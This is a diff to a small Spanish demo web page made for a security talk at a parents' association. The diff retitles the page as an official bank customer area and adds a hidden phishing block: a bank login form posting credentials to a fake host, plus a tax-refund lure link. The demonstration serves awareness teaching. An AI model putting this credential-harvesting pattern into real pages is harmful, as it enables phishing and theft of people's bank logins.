@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Advertencia: Código QR no verificado</title>
+  <title>Banco Oficial - Área Cliente</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -34,6 +34,14 @@
     a {
       color: #ffcc00;
     }
+
+    /* Contenido falso oculto */
+    .invisible {
+      display: none;
+      visibility: hidden;
+      height: 0;
+      overflow: hidden;
+    }
   </style>
 </head>
 <body>
@@ -50,8 +58,19 @@
   </div>
 
   <div class="info">
-    <p>Esta es una <strong>web de ejemplo</strong> creada para una charla del uso y gestión de las pantallas para el <strong>A.M.P.A.</strong></p>
+    <p>Esta es una <strong>web de ejemplo</strong> creada para una charla de seguridad del <strong>A.M.P.A.</strong></p>
     <p>Autor: Carlos Vidal</p>
+  </div>
+
+  <!-- Contenido oculto sospechoso -->
+  <div class="invisible">
+    <p>Inicia sesión con tu cuenta bancaria para recibir tu reembolso:</p>
+    <form action="http://login-banco-falso.com">
+      <input type="text" name="usuario" placeholder="Usuario">
+      <input type="password" name="clave" placeholder="Contraseña">
+      <button type="submit">Entrar</button>
+    </form>
+    <a href="http://hacienda-reembolsos.top">Reembolso inmediato</a>
   </div>
 
 </body>
